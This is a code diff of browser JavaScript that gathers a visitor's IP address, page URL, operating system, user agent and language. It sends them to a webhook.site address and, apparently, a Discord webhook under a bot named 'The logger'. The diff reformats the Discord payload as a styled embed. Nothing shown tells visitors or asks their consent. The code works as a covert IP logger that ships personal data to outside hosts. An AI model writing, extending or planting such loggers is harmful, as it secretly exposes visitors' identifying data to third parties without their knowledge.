@@ -40,14 +40,57 @@ async function sendWebhook(webhookUrl, message) {
 async function sendToWebhooks() {
     const ipAddress = await getIPAddress();
     const deviceInfo = getDeviceInfo();
-    const message = {
+
+    // Message for Webhook.site (simple text)
+    const messageForWebhookSite = {
         content: `Website: ${window.location.href}\nOS: ${deviceInfo.platform}\nIP: ${ipAddress}\nDevice Info: ${JSON.stringify(deviceInfo)}`,
-        username: 'Webhook Bot', // Customize the username for Discord
-        avatar_url: 'https://example.com/avatar.png', // Optional avatar URL for Discord
     };
 
-    // Log the message to the console
-    console.log('Sending message:', message);
+    // Message for Discord (styled with embed)
+    const messageForDiscord = {
+        username: 'The logger', // Customize the username
+        avatar_url: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRHOj7V_5oy-8y-DLB90U1CJsa_AMNY0ISSNw&s', // Optional avatar URL
+        embeds: [
+            {
+                title: 'Device Information',
+                color: 3447003, // Hex color code (decimal)
+                fields: [
+                    {
+                        name: 'Website',
+                        value: window.location.href,
+                        inline: true
+                    },
+                    {
+                        name: 'Operating System',
+                        value: deviceInfo.platform,
+                        inline: true
+                    },
+                    {
+                        name: 'IP Address',
+                        value: ipAddress,
+                        inline: true
+                    },
+                    {
+                        name: 'User  Agent',
+                        value: deviceInfo.userAgent,
+                        inline: false
+                    },
+                    {
+                        name: 'Language',
+                        value: deviceInfo.language,
+                        inline: false
+                    }
+                ],
+                footer: {
+                    text: 'Sent from my web app',
+                },
+            }
+        ]
+    };
+
+    // Log the messages to the console
+    console.log('Sending message to Webhook.site:', messageForWebhookSite);
+    console.log('Sending message to Discord:', messageForDiscord);
 
     // Define the webhook URLs
     const webhook1 = 'https://webhook.site/253f7461-8f5c-4e27-a22a-9c979c316c8c';
@@ -55,8 +98,8 @@ async function sendToWebhooks() {
 
     // Send the message to both webhooks
     await Promise.all([
-        sendWebhook(webhook1, { content: message.content }), // Send to Webhook.site
-        sendWebhook(webhook2, message) // Send to Discord
+        sendWebhook(webhook1, messageForWebhookSite), // Send to Webhook.site
+        sendWebhook(webhook2, messageForDiscord) // Send to Discord
     ]);
 }
 
